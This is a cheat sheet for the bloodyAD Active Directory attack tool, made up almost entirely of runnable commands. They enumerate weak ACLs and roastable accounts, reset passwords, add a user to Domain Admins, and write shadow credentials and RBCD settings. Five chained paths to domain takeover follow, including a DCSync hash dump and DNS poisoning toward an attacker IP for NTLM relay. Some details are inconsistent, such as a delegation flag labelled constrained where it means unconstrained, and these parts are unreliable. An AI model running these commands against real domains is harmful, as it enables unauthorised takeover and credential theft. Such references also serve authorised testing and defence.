# bloodyAD Cheat Sheet

## Quick Start

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' <CATEGORY> <FUNCTION> [OPTIONS]
```

## Global Options

| Option | Description |
|--------|-------------|
| `--host` | Domain controller hostname or IP (required) |
| `-d` | Domain for NTLM authentication |
| `-u` | Username |
| `-p` | Password or LMHASH:NTHASH |
| `-k` | Enable Kerberos auth (with optional `kdc=` `ccache=` `kirbi=` `keytab=`) |
| `-f` | Password format: `b64`, `hex`, `aes`, `rc4`, `default` |
| `-c` | Certificate path (`key:cert`) for Schannel/PKINIT |
| `-s` | Use LDAPS/GCS (use `-ss` for no encryption) |
| `-i` | DC IP (for hostname resolution) |
| `--dns` | DNS server IP (for inter-domain) |
| `-t` | Connection timeout (seconds) |
| `--gc` | Connect to Global Catalog |
| `-v` | Verbosity: `QUIET`, `INFO`, `DEBUG`, `TRACE` |
| `--json` | Output as JSON |

---

## GET Commands

### Get Object

```bash
bloodyAD -H <DC> -d <DOM> -u <USER> -p '<PASS>' get object <TARGET> --attr <ATTR1> <ATTR2>
```

**Filter syntax (LDAP):**

```bash
# All users with SPN (Kerberoastable)
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(servicePrincipalName=*))' \
  --attr servicePrincipalName sAMAccountName memberOf

# ASREPRoastable (DONT_REQ_PREAUTH)
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  --attr sAMAccountName

# All computers
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(objectClass=computer)' --attr dNSHostName operatingSystem

# Disabled accounts
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
  --attr sAMAccountName

# Domain trusts
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(objectClass=trustedDomain)' --attr name trustDirection trustType

# Specific user
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object jsmith

# Domain controller
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object dc01
```

### Get Writable

```bash
# Writable user objects (GenericAll)
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get writable --otype user

# Writable computer objects
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get writable --otype computer

# Objects with DCSync rights
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get writable --otype user --right DCSync

# Objects with WriteProperty on specific attr
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get writable --otype user --right WriteProperty

# All writable objects (any type)
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get writable
```

---

## SET Commands

### Set Password

```bash
# Reset user password
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set password targetuser 'NewP@ss123!'

# Using hash authentication
bloodyAD -H 192.168.1.10 -d corp.local -u admin \
  -p :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b \
  set password targetuser 'NewP@ss123!'
```

**Requirements:** `GenericAll`, `WriteProperty` on `ds-Change-Password`, or `User-Force-Change-Password`.

### Set Owner

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set owner jsmith targetuser
```

### Set GenericAll

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  setGenericAll targetuser jsmith
```

### Set RBCD (Resource-Based Constrained Delegation)

```bash
# Add allowed-to-act
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set rbcd target$ 'CONTROLLED$/$(SID)' --writeable

# Remove allowed-to-act
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set rbcd target$ 'CONTROLLED$/$(SID)' --delete
```

**Requirements:** `GenericAll` or `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### Set DNS Record

```bash
# Add A record
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  add dnsRecord dc01.corp.local 192.168.1.50 A

# Add SRV record
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  add dnsRecord _ldap._tcp.dc._msdcs.corp.local 192.168.1.50 SRV

# Delete DNS record
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  remove dnsRecord dc01.corp.local A
```

---

## ADD Commands

### Add Group Member

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add groupMember "Domain Admins" jsmith

bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add groupMember "Enterprise Admins" jsmith
```

### Add Shadow Credentials

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add shadowCredentials targetuser
```

**Requirements:** `GenericAll` or `WriteProperty` on `msDS-KeyCredentialLink`.

### Add Computer

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add computer controlled$ 'Comput3rP@ss!'
```

### Add Object

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add object 'CN=NewUser,OU=Users,DC=corp,DC=local' user
```

---

## REMOVE Commands

### Remove Group Member

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  remove groupMember "Domain Admins" jsmith
```

### Remove Object

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  remove object targetuser
```

---

## Authentication Examples

### NTLM with Password

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ssw0rd' get object dc01
```

### NTLM with Hash

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u administrator \
  -p :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b \
  get object dc01
```

### Kerberos with Password

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' -k get object dc01
```

### Kerberos with CCache

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin \
  -k kdc=192.168.1.10 ccache=/tmp/admin.ccache get object dc01
```

### Kerberos with Keytab

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin \
  -k kdc=192.168.1.10 keytab=/tmp/admin.keytab get object dc01
```

### Certificate (Schannel)

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin \
  -c 'key.pem:cert.pem' get object dc01
```

### Certificate (PKINIT)

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin \
  -k -c 'key.pem:cert.pem' get object dc01
```

---

## Output Formats

### JSON Output

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --json get object dc01
```

### Quiet Output

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  -v QUIET get object dc01
```

---

## Network Options

### SOCKS Proxy

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --socks socks5://127.0.0.1:1080 get object dc01
```

### LDAPS

```bash
bloodyAD -H dc01.corp.local -d corp.local -u admin -p 'P@ss' \
  -s get object dc01
```

### Global Catalog

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --gc get object dc01
```

### Custom DNS

```bash
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --dns 8.8.8.8 get object dc01
```

---

## Privilege Escalation Chained Attacks

### Chain 1: User → Domain Admin

```bash
# 1. Enumerate writable objects
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' get writable --otype group

# 2. Add to Domain Admins
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add groupMember "Domain Admins" jsmith
```

### Chain 2: User → DCSync → Domain Dump

```bash
# 1. Enumerate DCSync rights
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  get writable --otype user --right DCSync

# 2. If DCSync available, use secretsdump
secretsdump.py corp.local/jsmith:'P@ss'@192.168.1.10 -just-dc-ntlm
```

### Chain 3: Shadow Credentials → Kerberos

```bash
# 1. Add shadow credential
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add shadowCredentials targetuser

# 2. Request TGT using PKINIT
# (use gettgtpkinit.py or similar tool with the generated cert/key)

# 3. Use TGT for further operations
```

### Chain 4: RBCD → Impersonation

```bash
# 1. Create computer account
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add computer controlled$ 'Comput3rP@ss!'

# 2. Set RBCD
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set rbcd target$ 'CONTROLLED$' --writeable

# 3. Get ticket as any user (e.g., administrator)
# (use getST.py with the computer account hash)
```

### Chain 5: DNS Relay

```bash
# 1. Modify LDAP DNS record to point to attacker
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add dnsRecord ldap.dc01._msdcs.corp.local 10.10.14.5 A

# 2. Set up ntlmrelayx to relay to the DC
ntlmrelayx.py -t 192.168.1.10 -socks -smb2support

# 3. Trigger authentication (e.g., via PrinterBug)
```

---

## User-Guide Reference

| Function | Category | Description |
|----------|----------|-------------|
| `get object` | GET | Read AD object attributes |
| `get writable` | GET | Find objects with weak ACLs |
| `set password` | SET | Reset user password |
| `set owner` | SET | Change object owner |
| `set rbcd` | SET | Configure RBCD delegation |
| `setGenericAll` | SET | Grant GenericAll permission |
| `add groupMember` | ADD | Add user to group |
| `add shadowCredentials` | ADD | Add shadow credential key |
| `add computer` | ADD | Create computer account |
| `add dnsRecord` | ADD | Create DNS record |
| `remove groupMember` | REMOVE | Remove user from group |
| `remove object` | REMOVE | Delete AD object |
| `remove dnsRecord` | REMOVE | Delete DNS record |
| `msldap` | MSLDAP | Raw LDAP operations |

---

## Common UserAccountControl Flags

| Flag | Value | Description |
|------|-------|-------------|
| SCRIPT | 0x0001 | Logon script |
| ACCOUNTDISABLE | 0x0002 | Account disabled |
| HOMEDIR_REQUIRED | 0x0008 | Home directory required |
| PASSWD_NOTREQD | 0x0020 | No password required |
| PASSWD_CANT_CHANGE | 0x0040 | Password can't change |
| NORMAL_ACCOUNT | 0x0200 | Normal user account |
| DONT_REQ_PREAUTH | 0x400000 | No preauth required (ASREPRoast) |
| TRUSTED_FOR_DELEGATION | 0x80000 | Constrained delegation |
| TRUSTED_TO_AUTH_FOR_DELEGATION | 0x1000000 | Protocol transition |

---

## Quick Enumeration One-Liners

```bash
# Domain info
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object 'DC=corp,DC=local'

# All users
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object --filter '(objectClass=user)' --attr sAMAccountName

# All groups
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object --filter '(objectClass=group)' --attr cn member

# Admin count users
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object --filter '(adminCount=1)' --attr sAMAccountName

# Unconstrained delegation
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' --attr sAMAccountName

# Constrained delegation
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object --filter '(msDS-AllowedToDelegateTo=*)' --attr sAMAccountName msDS-AllowedToDelegateTo

# Password not required
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' get object --filter '(userAccountControl:1.2.840.113556.1.4.803:=32)' --attr sAMAccountName
```

---

## Debugging

```bash
# Full debug output
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' -v TRACE get object dc01

# Test connectivity
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' -v INFO get object 'DC=corp,DC=local'

# JSON for scripting
bloodyAD -H 192.168.1.10 -d corp.local -u admin -p 'P@ss' --json get object dc01 | jq .
```
